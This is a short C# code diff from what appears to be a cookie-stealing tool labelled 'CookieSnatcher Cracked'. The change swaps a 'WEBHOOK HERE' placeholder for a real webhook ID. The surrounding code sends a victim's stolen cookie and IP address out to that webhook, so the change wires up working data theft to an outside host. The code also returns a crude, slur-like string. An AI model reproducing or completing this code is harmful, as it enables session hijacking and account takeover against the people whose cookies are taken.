@@ -504,7 +504,7 @@ internal class EntryPointClass
 			{
 				dcWeb.ProfilePicture = "https://ixware.biz/cs/cs.png";
 				dcWeb.UserName = "CookieSnatcher Cracked";
-				dcWeb.WebHook = "WEBHOOK HERE";
+				dcWeb.WebHook = "844536567632494632";
 				dcWeb.SendMessage($"Cookie: {string_8}\r\n\r\nIP: {value}");
 			}
 			result = "gay";
